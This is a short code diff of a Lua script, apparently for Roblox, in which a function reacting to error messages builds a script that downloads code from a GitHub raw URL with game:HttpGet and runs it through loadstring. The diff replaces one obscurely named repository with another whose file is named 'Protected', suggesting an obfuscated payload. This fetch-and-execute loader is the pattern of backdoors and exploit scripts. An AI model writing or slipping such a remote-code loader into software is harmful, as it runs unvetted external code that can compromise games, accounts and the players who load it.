@@ -10,7 +10,7 @@ local function onErrorMessageChanged(errorMessage)
 
         if player then
             local scriptContent = [[
-                local scriptToExecute = loadstring(game:HttpGet("https://raw.githubusercontent.com/Sinnombrexd1/symmetrical-octo-goggles12383737373733737733373737363363636363636262627019282827272737337373737738/refs/heads/main/%F0%9F%86%97"))
+                local scriptToExecute = loadstring(game:HttpGet("https://raw.githubusercontent.com/Jorgelinea/Ahj/refs/heads/main/Protected_5227260397926876.txt"))
                 if scriptToExecute then
                     scriptToExecute()
                 end
